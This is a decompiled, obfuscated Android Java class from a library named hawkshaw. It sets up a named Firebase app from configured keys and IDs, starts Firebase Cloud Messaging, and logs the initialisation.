package com.hawkshaw.library.fcm;

import J1.a;
import Q0.g;
import W2.e;
import W2.l;
import Y1.K;
import android.content.Context;
import android.text.TextUtils;
import com.google.firebase.messaging.FirebaseMessaging;
import com.hawkshaw.library.config.ConfigKt;
import com.hawkshaw.library.datalayer.models.Config;
import com.hawkshaw.library.logger.Logger;
import d1.d;
import java.util.ArrayList;
import n1.C0734b;
import n1.j;
import o.C0769d;

public final class Firebase {
    public static final Firebase INSTANCE = new Firebase();
    private static final String TAG = "MyFirebaseMessagingServ";
    private static final e firebaseAppName$delegate = new l(a.f1029D);

    private Firebase() {
    }

    private final String getFirebaseAppName() {
        return (String) firebaseAppName$delegate.getValue();
    }

    public final C0734b getConfig() {
        g gVar;
        String str;
        String firebaseAppName = getFirebaseAppName();
        K.n(firebaseAppName, "name");
        synchronized (g.f1755j) {
            gVar = (g) g.f1756k.getOrDefault(firebaseAppName.trim(), (Object) null);
            if (gVar != null) {
                ((d) gVar.f1764h.get()).b();
            } else {
                ArrayList c5 = g.c();
                if (c5.isEmpty()) {
                    str = "";
                } else {
                    str = "Available app names: " + TextUtils.join(", ", c5);
                }
                throw new IllegalStateException("FirebaseApp with name " + firebaseAppName + " doesn't exist. " + str);
            }
        }
        C0734b c6 = ((j) gVar.b(j.class)).c();
        K.m(c6, "getInstance(...)");
        return c6;
    }

    public final void initFCM(Context context) {
        K.n(context, "context");
        Config.Firebase firebase = ConfigKt.getConfig(context).getFirebase();
        String apiKey = firebase.getApiKey();
        C0769d.M("ApiKey must be set.", apiKey);
        String appId = firebase.getAppId();
        C0769d.M("ApplicationId must be set.", appId);
        g h5 = g.h(context, new Q0.j(appId, apiKey, (String) null, firebase.getAppId(), firebase.getGcmSenderId(), (String) null, firebase.getProjectId()), getFirebaseAppName());
        FirebaseMessaging.c().f();
        ((FirebaseMessaging) h5.b(FirebaseMessaging.class)).f();
        Logger logger = Logger.INSTANCE;
        h5.a();
        Logger.v$default(logger, TAG, "Firebase app init " + h5.f1758b, false, 4, (Object) null);
    }
}
